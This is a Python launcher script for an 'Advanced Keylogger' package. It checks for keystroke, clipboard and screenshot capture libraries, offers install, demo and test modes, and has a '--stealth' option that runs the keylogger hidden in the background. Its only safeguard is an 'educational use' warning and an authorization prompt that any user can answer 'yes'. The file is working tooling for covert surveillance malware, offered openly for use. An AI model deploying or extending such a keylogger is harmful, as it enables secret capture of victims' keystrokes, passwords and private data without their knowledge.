#!/usr/bin/env python3
"""
Quick launcher for the Advanced Keylogger
Provides a simple interface to start the keylogger with different options
"""

import sys
import os
import argparse
from pathlib import Path

def check_dependencies():
    """Check if required dependencies are installed"""
    required_packages = [
        'pynput', 'pyperclip', 'PIL', 'pyautogui', 
        'cryptography', 'schedule', 'psutil'
    ]
    
    missing = []
    for package in required_packages:
        try:
            if package == 'PIL':
                import PIL
            else:
                __import__(package)
        except ImportError:
            missing.append(package)
    
    return missing

def main():
    parser = argparse.ArgumentParser(
        description='Advanced Keylogger Launcher',
        epilog='Educational and Research Purposes Only'
    )
    
    parser.add_argument(
        '--install', 
        action='store_true',
        help='Run installation and setup'
    )
    
    parser.add_argument(
        '--demo', 
        action='store_true',
        help='Run component demonstration'
    )
    
    parser.add_argument(
        '--test', 
        action='store_true',
        help='Run component tests'
    )
    
    parser.add_argument(
        '--config', 
        type=str,
        help='Specify custom configuration file'
    )
    
    parser.add_argument(
        '--stealth', 
        action='store_true',
        help='Force stealth mode (hide console)'
    )
    
    args = parser.parse_args()
    
    # Change to script directory
    script_dir = Path(__file__).parent
    os.chdir(script_dir)
    
    # Handle different modes
    if args.install:
        print("Running installation...")
        os.system('python install.py')
        return
    
    if args.demo:
        print("Running demonstration...")
        os.system('python demo.py')
        return
    
    if args.test:
        print("Running tests...")
        os.system('python test_components.py')
        return
    
    # Check dependencies
    missing = check_dependencies()
    if missing:
        print("Missing dependencies:")
        for package in missing:
            print(f"  - {package}")
        print("\nRun 'python launcher.py --install' to install dependencies")
        print("Or install manually: pip install -r requirements.txt")
        return
    
    # Check configuration
    if args.config:
        config_file = args.config
    else:
        config_file = 'config.json'
    
    if not Path(config_file).exists():
        print(f"Configuration file '{config_file}' not found!")
        print("Run 'python launcher.py --install' to create configuration")
        return
    
    # Legal warning
    print("⚠️  LEGAL WARNING ⚠️")
    print("This software is for educational and research purposes only.")
    print("Ensure you have proper authorization before using this tool.")
    print("Unauthorized surveillance may be illegal in your jurisdiction.")
    print()
    
    response = input("Do you have proper authorization to use this tool? (yes/no): ")
    if response.lower() != 'yes':
        print("Exiting...")
        return
    
    # Prepare environment variables
    env = os.environ.copy()
    if args.config:
        env['KEYLOGGER_CONFIG'] = args.config
    
    # Start keylogger
    print("Starting keylogger...")
    if args.stealth:
        # Run in background/hidden mode
        if os.name == 'nt':
            os.system('python keylogger.py >nul 2>&1')
        else:
            os.system('python keylogger.py >/dev/null 2>&1 &')
    else:
        os.system('python keylogger.py')

if __name__ == "__main__":
    main()